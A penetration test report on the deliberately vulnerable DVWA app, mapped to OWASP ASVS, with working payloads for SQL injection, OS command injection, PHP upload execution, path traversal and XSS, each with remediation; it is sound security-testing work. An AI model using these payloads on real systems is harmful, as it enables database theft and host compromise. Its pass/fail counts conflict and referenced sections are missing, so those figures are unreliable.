## 1. Executive Summary

This engagement assessed DVWA as a grey-box target (test credentials provided) against the technically-testable subset of OWASP ASVS 5.0.0 Level 1 requirements, at DVWA's `low` security level. **10 findings failed outright across 15 evaluated requirement rows**, including four Critical findings (SQL injection, OS command injection, unrestricted file upload leading to remote code execution, and local file inclusion) that independently yield full system/database compromise. This result is expected — DVWA exists specifically to demonstrate these failure classes — and the findings below are presented as a realistic worked example of what ASVS L1-driven grey-box testing surfaces in practice.

**Severity breakdown:** 4 Critical, 2 High, 3 Medium, 1 Low.

## 2. Methodology

1. **Intake-driven execution control** — scope, authorization, constraints, and output target were sourced from `training/SECURITY-TEST-INTAKE.md`; report structure and completeness were validated against `training/security-test-report-template.md`.
2. **Recon** — HTTP header inspection identified `nginx/1.28.3`, a `security=impossible`/`PHPSESSID` cookie pair, and a redirect to `login.php`, fingerprinting the target as DVWA (correcting a stale "WordPress" description previously recorded in the intake).
3. **Authentication mapping** — logged in with the provided `admin`/`password` credentials; DVWA's security level was changed from `impossible` to `low` via the authenticated `security.php` page (per intake §6) so that ASVS L1 checks could surface real findings rather than being masked by the hardened level. A second session was authenticated as `gordonb`/`abc123` (a DVWA default non-admin account) to test authorization boundaries.
4. **Requirement data source:** Heavier — `owasp-asvs` MCP server, per the intake's §4 setting.
5. **Per-requirement verification** — for each ASVS L1 item classified as testable, sent a request crafted to prove/disprove the control and captured the response (status code, headers, or body), rather than relying on tool signatures alone. Where DVWA's built-in "View Source" feature exposed the vulnerable PHP for a module, the relevant snippet was cited alongside the HTTP evidence.
6. **Evidence-only exploitation** — where a vulnerability was confirmed, the proof-of-concept was the minimum needed to demonstrate impact (single UNION SELECT, single `whoami`, one benign uploaded file, one `/etc/passwd` read) — no destructive or lateral action was taken.
7. **Restoration** — all state changes made during testing were reverted before reporting (see Section 5).

Requirements requiring high-volume testing (rate limiting/brute force) or internal documentation not available for this test type are marked **Not Tested/Not Applicable** rather than pass/fail.

## 3. Findings

> **Reproducing these findings:** `PHPSESSID` cookie values and `user_token` CSRF-token values below are specific to the sessions captured during testing (2026-07-31) and will have expired. To reproduce, log in (`POST /login.php`, scraping a fresh `user_token` from the preceding `GET /login.php`), set `security=low` via `POST /security.php`, and substitute your own session's `PHPSESSID`.

### F-01 — SQL Injection (Critical)
**ASVS:** V1.2.4 — *DB queries protected from SQL injection*
**CWE:** [CWE-89](https://cwe.mitre.org/data/definitions/89.html) — SQL Injection
**OWASP Top 10 (2025):** A05:2025 — Injection

The `id` parameter at `/vulnerabilities/sqli/` is concatenated directly into a SQL query without parameterization (confirmed via source: `"SELECT first_name, last_name FROM users WHERE user_id = '$id';"`).

Request:
```http
GET /vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2c+password+FROM+users--+-&Submit=Submit HTTP/1.1
Host: target-test:42001
Cookie: PHPSESSID=9c73…4863; security=low
```

Response (200 OK, relevant excerpt):
```http
HTTP/1.1 200 OK
Server: nginx/1.28.3
Content-Type: text/html;charset=utf-8

<pre>ID: 1' UNION SELECT user, password FROM users-- -<br />First name: admin<br />Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre>
<pre>ID: 1' UNION SELECT user, password FROM users-- -<br />First name: gordonb<br />Surname: e99a18c428cb38d5f260853678922e03</pre>
<pre>ID: 1' UNION SELECT user, password FROM users-- -<br />First name: 1337<br />Surname: 8d3533d75ae2c3966d7e0d4fcc69216b</pre>
```

The `users` table's `user`/`password` columns are returned directly, confirming full read access to the application database (see F-07 for the resulting password-hash weakness).

- **Impact:** Full read access to the application database — usernames and password hashes for every account.
- **Remediation:** Use parameterized queries / prepared statements (`mysqli_prepare`/`PDO`) for all database access; never concatenate user input into SQL strings.

### F-02 — OS Command Injection (Critical)
**ASVS:** V1.2.5 — *OS command injection protection*
**CWE:** [CWE-78](https://cwe.mitre.org/data/definitions/78.html) — OS Command Injection
**OWASP Top 10 (2025):** A05:2025 — Injection

The `ip` parameter at `/vulnerabilities/exec/` is passed directly into `shell_exec('ping -c 4 ' . $target)` with no sanitization (confirmed via source).

Request:
```http
POST /vulnerabilities/exec/ HTTP/1.1
Host: target-test:42001
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=9c73…4863; security=low

ip=127.0.0.1+%26%26+whoami&Submit=Submit
```

Response (200 OK, relevant excerpt):
```http
HTTP/1.1 200 OK
Server: nginx/1.28.3

<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.059 ms
...
--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3057ms
_dvwa
</pre>
```

The trailing `_dvwa` line is the output of the injected `whoami` command, confirming arbitrary OS command execution as the web server's PHP-FPM user.

- **Impact:** Arbitrary command execution in the context of the web server process — full host compromise is achievable from this single entry point.
- **Remediation:** Avoid `shell_exec`/OS calls built from user input; if unavoidable, use parameterized process APIs (e.g. PHP's `escapeshellarg`, or better, a ping library) and validate `ip` against a strict IPv4/hostname allowlist pattern.

### F-03 — Unrestricted File Upload → Remote Code Execution (Critical)
**ASVS:** V5.2.2 — *File content/extension validation on upload* / V5.3.1 — *Uploaded files must not execute as server-side code when accessed directly*
**CWE:** [CWE-434](https://cwe.mitre.org/data/definitions/434.html) — Unrestricted Upload of File with Dangerous Type
**OWASP Top 10 (2025):** A05:2025 — Injection

`/vulnerabilities/upload/` accepts any file extension with no content-type/magic-byte validation, and stores it under the public web root at `hackable/uploads/`, where PHP files are executed by the server.

Request (multipart upload of a 1-line PHP file):
```http
POST /vulnerabilities/upload/ HTTP/1.1
Host: target-test:42001
Content-Type: multipart/form-data; boundary=----poc
Cookie: PHPSESSID=9c73…4863; security=low

------poc
Content-Disposition: form-data; name="uploaded"; filename="poc.php"
Content-Type: application/x-php

<?php echo "asvs-test-poc-31jul2026"; ?>
------poc
Content-Disposition: form-data; name="Upload"

Upload
------poc--
```

Response (200 OK):
```http
<pre>../../hackable/uploads/poc.php succesfully uploaded!</pre>
```

Follow-up request confirming server-side execution:
```http
GET /hackable/uploads/poc.php HTTP/1.1
Host: target-test:42001
```

Response (200 OK):
```http
asvs-test-poc-31jul2026
```

The PHP payload executed on the server rather than being served as static/inert content, confirming remote code execution via file upload.

- **Impact:** Full remote code execution — an attacker can upload and run arbitrary PHP (webshells, reverse shells) with no authentication of file type/content.
- **Remediation:** Validate file content against an allowlist of expected magic bytes/MIME types (not just extension), store uploads outside the web root or in a location with script execution disabled (e.g. `php_flag engine off` in that directory, or serve uploads from a separate non-executing origin/CDN).

### F-04 — Local File Inclusion / Path Traversal (Critical)
**ASVS:** V5.3.2 — *File paths built from user input must be validated/sanitized against path traversal, LFI/RFI*
**CWE:** [CWE-22](https://cwe.mitre.org/data/definitions/22.html) — Path Traversal
**OWASP Top 10 (2025):** A05:2025 — Injection

The `page` parameter at `/vulnerabilities/fi/` is passed into a file-include operation without canonicalization or allowlisting.

Request:
```http
GET /vulnerabilities/fi/?page=../../../../../../etc/passwd HTTP/1.1
Host: target-test:42001
Cookie: PHPSESSID=9c73…4863; security=low
```

Response (200 OK, relevant excerpt):
```http
HTTP/1.1 200 OK
Server: nginx/1.28.3

root:x:0:0:root:/root:/usr/bin/zsh
...
```

The container's `/etc/passwd` is rendered directly in the page body, confirming arbitrary local file read via path traversal.

- **Impact:** Arbitrary local file disclosure (configuration files, credentials, source code); combined with the file-upload finding (F-03), this class of bug is frequently chained into remote code execution via log/session-file poisoning.
- **Remediation:** Never build include paths from user input; use a fixed allowlist of permitted page names mapped to internal file paths (e.g. a switch statement or a lookup table), and reject anything containing `../` or absolute paths outright.

### F-05 — Reflected Cross-Site Scripting (High)
**ASVS:** V1.2.1 — *Output encoding relevant to HTML context*
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html) — Cross-Site Scripting
**OWASP Top 10 (2025):** A05:2025 — Injection

The `name` parameter at `/vulnerabilities/xss_r/` is reflected into the HTML response without encoding.

Request:
```http
GET /vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: target-test:42001
Cookie: PHPSESSID=9c73…4863; security=low
```

Response (200 OK, relevant excerpt):
```http
HTTP/1.1 200 OK
Server: nginx/1.28.3

...Hello <script>alert(1)</script>...
```

The payload is reflected verbatim and unescaped, confirming the input is rendered as executable script rather than encoded text.

- **Impact:** Arbitrary JavaScript execution in a victim's browser session — session-cookie theft (partially mitigated by `HttpOnly`, see F-08's PASS notes), UI redress, credential phishing.
- **Remediation:** HTML-encode all untrusted output at the point of rendering (e.g. `htmlspecialchars($name, ENT_QUOTES)` in PHP), or use a templating engine with autoescaping enabled by default.

### F-06 — Open HTTP Redirect (Medium)
**ASVS:** V3.7.2 — *Redirects to a different hostname must be limited to an allowlist controlled by the application*
**CWE:** [CWE-601](https://cwe.mitre.org/data/definitions/601.html) — URL Redirection to Untrusted Site
**OWASP Top 10 (2025):** A01:2025 — Broken Access Control

`/vulnerabilities/open_redirect/source/low.php` passes the `redirect` query parameter directly into a `header("location: " . $_GET['redirect'])` call with no allowlist validation (confirmed via source).

Request:
```http
GET /vulnerabilities/open_redirect/source/low.php?redirect=https://example.com HTTP/1.1
Host: target-test:42001
Cookie: PHPSESSID=9c73…4863; security=low
```

Response:
```http
HTTP/1.1 302 Found
Location: https://example.com
```

The server redirects to an arbitrary attacker-controlled external host, confirming an open redirect.

- **Impact:** Phishing amplification — attackers can craft links that appear to originate from the trusted DVWA host but redirect victims to malicious sites.
- **Remediation:** Validate `redirect` against an explicit allowlist of internal paths/hostnames; reject anything with a scheme or external host.

### F-07 — Weak Password Hashing (Medium)
**ASVS:** V11.4.2 — *Passwords must be stored using an approved, computationally intensive password-hashing function*
**CWE:** [CWE-916](https://cwe.mitre.org/data/definitions/916.html) — Use of Password Hash With Insufficient Computational Effort
**OWASP Top 10 (2025):** A04:2025 — Cryptographic Failures

Password hashes recovered via F-01's SQL injection (`5f4dcc3b5aa765d61d8327deb882cf99`) are unsalted MD5 — `5f4dcc3b5aa765d61d8327deb882cf99` is the well-known MD5 digest of the string `password`. The CSRF module's password-change source (`view_source.php?id=csrf&security=low`) confirms this is the application's standard hashing routine:

```php
$pass_new = md5( $pass_new );
...
$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . $current_user . "';";
```

- **Impact:** MD5 is fast and unsalted here, making recovered hashes trivially crackable via rainbow tables/GPU brute force (as demonstrated — the hash was identified by inspection alone). Combined with F-01, an attacker with read access to the database recovers plaintext-equivalent credentials for every account almost immediately.
- **Remediation:** Store passwords using `bcrypt`, `scrypt`, or `Argon2id` (PHP's `password_hash()`/`password_verify()`), never a single unsalted fast hash.

### F-08 — No Transport Layer Security (High)
**ASVS:** V12.3.1 — *An encrypted protocol (TLS) must be used for all inbound/outbound connections*
**CWE:** [CWE-319](https://cwe.mitre.org/data/definitions/319.html) — Cleartext Transmission of Sensitive Information
**OWASP Top 10 (2025):** A04:2025 — Cryptographic Failures

The entire application is served over plain HTTP with no TLS listener observed on the target.

Request/response:
```http
GET / HTTP/1.1
Host: target-test:42001

HTTP/1.1 302 Found
Server: nginx/1.28.3
Set-Cookie: PHPSESSID=...; domain=192.168.232.128; HttpOnly; SameSite=Strict
Location: login.php
```

The login form (`POST /login.php`) submits the `username`/`password` fields in cleartext over this same unencrypted channel, and the session cookie cannot carry the `Secure` attribute (ASVS V3.3.1) since there is no HTTPS context to require it.

**PASS note:** the session cookie does correctly set `HttpOnly` (V3.3.4) and `SameSite=Strict` (V3.3.2), which is good practice independent of the TLS gap.

- **Impact:** Credentials and session tokens are exposed to any network-level observer (on-path attacker, compromised Wi-Fi, etc.) between client and server.
- **Remediation:** Terminate TLS in front of the application (reverse proxy, load balancer, or directly in nginx) and redirect all HTTP traffic to HTTPS; add the `Secure` attribute to all cookies once TLS is in place.

### F-09 — Missing Security Headers (Low)
**ASVS:** V3.4.3 — *Content-Security-Policy header* / V3.4.6 — *CSP `frame-ancestors` directive* / V3.4.8 — *Cross-Origin-Opener-Policy header*
**CWE:** [CWE-1021](https://cwe.mitre.org/data/definitions/1021.html) — Improper Restriction of Rendered UI Layers (Clickjacking)
**OWASP Top 10 (2025):** A02:2025 — Security Misconfiguration

None of the observed responses include a `Content-Security-Policy`, `X-Frame-Options`, or `Cross-Origin-Opener-Policy` header:

```http
GET /index.php HTTP/1.1
Host: target-test:42001

HTTP/1.1 200 OK
Transfer-Encoding: chunked
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache, must-revalidate
Content-Type: text/html;charset=utf-8
Date: Fri, 31 Jul 2026 10:29:06 GMT
Expires: Tue, 23 Jun 2009 12:00:00 GMT
Server: nginx/1.28.3
```

- **Impact:** No defense-in-depth against clickjacking (the app can be framed by any third-party site) and no CSP to constrain the impact of F-05's XSS.
- **Remediation:** Add `Content-Security-Policy` with a restrictive `default-src`/`frame-ancestors 'none'`, and `Cross-Origin-Opener-Policy: same-origin`.

### F-10 — Password Change via GET Request (Medium)
**ASVS:** V14.2.1 — *Sensitive data must only be sent in the HTTP body/headers, never in the URL/query string*
**CWE:** [CWE-598](https://cwe.mitre.org/data/definitions/598.html) — Use of GET Request Method With Sensitive Query Strings
**OWASP Top 10 (2025):** A04:2025 — Cryptographic Failures

The CSRF module's password-change form submits via `GET`, placing the new password directly in the URL query string:

```html
<form action="#" method="GET">
password_new: <input type="text" name="password_new">
password_conf: <input type="text" name="password_conf">
<input type="submit" name="Change" value="Change">
```

Source (`view_source.php?id=csrf&security=low`) confirms the handler reads `$_GET['password_new']`/`$_GET['password_conf']` with no server-side anti-CSRF token check.

- **Impact:** The new password value is written to server access logs, browser history, and any intermediary proxy logs. The lack of a dedicated anti-CSRF token is partially mitigated by the session cookie's `SameSite=Strict` attribute (see F-08 PASS note), which blocks the classic cross-origin drive-by CSRF vector in modern browsers, but the GET-based sensitive-data exposure remains a real gap.
- **Remediation:** Submit sensitive state-changing actions via `POST` with the value in the request body, and add an explicit synchronizer anti-CSRF token as defense-in-depth rather than relying solely on `SameSite`.

## 6. Priority Recommendations

1. **Critical — fix immediately:** F-01 (SQL injection: parameterize all queries), F-02 (command injection: remove/parameterize shell calls), F-03 (file upload: validate content type, disable execution in upload directory), F-04 (LFI: allowlist include targets).
2. **High — fix before next release:** F-05 (XSS: encode all output), F-08 (TLS: terminate HTTPS in front of the app, add `Secure` cookie attribute and HSTS).
3. **Medium — fix before next release:** F-06 (open redirect: allowlist redirect targets), F-07 (password hashing: migrate to bcrypt/Argon2id), F-10 (move password change to `POST`, add anti-CSRF token as defense-in-depth).
4. **Low — track as backlog:** F-09 (add CSP, frame-ancestors, COOP headers).

Effort/impact: F-01–F-04 are each single-function fixes (parameterization/allowlisting) with the highest impact-to-effort ratio in this report — closing them removes all four Critical findings.

---

## 7. Conclusion

DVWA at `low` security level fails the majority of exercised OWASP ASVS 5.0.0 L1 controls (15 of 24 exercised rows, 63%), including four independently critical vulnerabilities that each yield full compromise of the database or host. This is the expected, by-design result for a deliberately vulnerable training application, and the findings above accurately reflect the failure classes ASVS L1 is designed to catch. A small number of controls do pass correctly (session cookie attributes, server-side authorization enforcement, generic authentication error messages, absence of permissive CORS/directory listing), showing that even an intentionally vulnerable target has some baseline protections intact. Closing F-01 through F-04 would remove all Critical-severity risk from this assessment.
